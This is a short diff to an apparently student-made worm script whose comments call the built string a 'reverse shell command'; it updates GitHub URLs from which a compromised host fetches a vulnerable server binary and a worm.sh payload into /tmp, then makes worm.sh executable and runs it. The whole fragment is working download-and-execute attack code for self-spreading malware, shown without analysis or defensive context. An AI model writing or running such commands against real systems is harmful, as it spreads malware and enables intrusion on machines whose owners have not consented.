@@ -7,11 +7,11 @@ port = int(input("Port: "))
 
 # Reverse shell command
 command = (
-    # Download vulserver on /tmp/ in case it is not already there
-    "wget https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/Simpleworm/vulserver"
-    "-O /tmp/vulserser; sleep 3;" 
-    # Download worm.sh on /tmp/ and execute it
-    "wget https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh"
+    # Download vulserver to /tmp/ if not already there
+    "wget https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/main/Simpleworm/vulserver "
+    "-O /tmp/vulserver; sleep 3; "
+    # Download worm.sh to /tmp/ and execute it
+    "wget https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/main/Simpleworm/worm.sh "
     "-O /tmp/worm.sh; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
 )
 
